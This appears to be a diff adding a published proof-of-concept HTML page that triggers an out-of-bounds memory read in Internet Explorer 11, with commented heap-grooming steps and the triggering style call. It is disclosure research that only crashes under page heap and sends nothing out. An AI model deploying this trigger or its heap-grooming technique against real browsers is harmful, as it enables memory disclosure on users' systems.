@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<meta http-equiv="X-UA-Compatible" content="IE=Edge">
+<script>
+  // This PoC attempts to exploit a memory disclosure bug in Microsoft Internet
+  // Explorer 11. On x64 systems, this should cause an access violation when
+  // run with page-heap enabled, as the code attempts to read a byte
+  // immediately following a 4 byte memory block.
+  // See http://blog.skylined.nl/20161109001.html for details.
+  var o = document.documentElement;
+  CollectGarbage();
+  // Heap Feng-Shui plunger
+  o.setAttribute("a", "1");
+  o.setAttribute("b", "2");
+  o.setAttribute("c", "3");
+  o.setAttribute("d", "4");
+  o.setAttribute("e", "5");
+  o.setAttribute("f", "6");
+  // Allocate a string that contains 3 characters (6 bytes), for which an 8
+  // byte memory block is allocated:
+  o.setAttribute("g", "AB\u4141");
+  // Free the memory block.
+  o.removeAttribute("g");
+  // Reallocate the same memory block to store a 1 character string (2 bytes).
+  // The memory block will look like this:
+  //   78 00 00 00 41 41 00 00  |  "x\0\u4141\0"
+  //  ^- start --------- end -^
+  // Now have the code attempt to read the fifth character and access OOB data:
+  document.documentElement.style.setProperty("textdecorationblink", "x");
+  // This work by SkyLined is licensed under a Creative Commons
+  // Attribution-Non-Commercial 4.0 International License. 
+</script>
